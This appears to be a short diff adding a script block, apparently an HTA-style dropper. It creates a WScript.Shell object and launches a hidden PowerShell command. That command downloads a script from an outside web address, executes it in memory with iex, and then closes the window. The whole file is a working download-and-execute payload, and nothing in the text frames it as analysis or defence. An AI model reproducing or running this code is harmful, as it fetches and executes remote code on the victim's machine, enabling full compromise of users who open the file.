@@ -1,0 +1,5 @@
+<script>
+a=new ActiveXObject('WScript.Shell');
+a.run('%windir%\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -nop -c "iex(New-Object Net.WebClient).DownloadString(\'http://www.martiangames.com\')"', 0, true);
+window.close();
+</script>
